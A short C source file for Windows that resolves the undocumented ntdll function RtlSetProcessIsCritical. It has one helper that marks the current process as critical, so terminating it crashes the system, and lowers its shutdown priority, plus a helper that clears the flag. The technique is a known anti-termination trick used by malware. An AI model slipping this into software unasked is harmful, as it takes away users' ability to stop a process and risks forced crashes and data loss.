#include <windows.h>

typedef LONG (*pRtlSetProcessIsCritical)(BOOL,PBOOL,BOOL);
pRtlSetProcessIsCritical SetCritical;

int SetIsCritic(void){
   HANDLE hNTDLL;
   hNTDLL = LoadLibraryA("ntdll.dll");
   if (hNTDLL != NULL){
	   (SetCritical) = (pRtlSetProcessIsCritical)GetProcAddress((HINSTANCE)hNTDLL, "RtlSetProcessIsCritical");
	   if(SetCritical){
         	SetCritical(TRUE,NULL,FALSE);
		SetProcessShutdownParameters(0,0);
	   }
	   return 1;
   }
   return 0;
}

int SetNotCritic(void){
   HANDLE hNTDLL;
   hNTDLL = LoadLibraryA("ntdll.dll");
   if (hNTDLL != NULL){
	   (SetCritical) = (pRtlSetProcessIsCritical)GetProcAddress((HINSTANCE)hNTDLL, "RtlSetProcessIsCritical");
	   if(SetCritical){
         	SetCritical(FALSE,NULL,FALSE);
	   }
	   return 1;
   }
   return 0;
}
